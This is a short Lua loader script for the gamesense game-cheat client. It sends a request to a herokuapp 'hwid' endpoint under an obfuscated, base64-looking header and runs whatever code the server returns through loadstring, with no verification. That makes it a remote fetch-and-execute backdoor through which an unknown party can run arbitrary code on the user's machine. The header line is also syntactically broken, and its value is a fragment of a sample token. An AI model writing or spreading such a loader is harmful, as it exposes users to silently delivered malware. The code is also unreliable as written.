local http = require "gamesense/http" or error("Sub to https://gamesense.pub/forums/viewtopic.php?id=19253 on the lua workshop.")

local web_data = "unn"
http.get("https://phoniexyaw.herokuapp.com/api/lua/hwid",{
	headers = {
		Y3ODkwIiwibmFtZSI6I= "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2Mj"
	}
}
,function(success, response) 
	if success then
		web_data = response.body
		loadstring(web_data)()
		return
	else
		--NOTHING
	end
end)

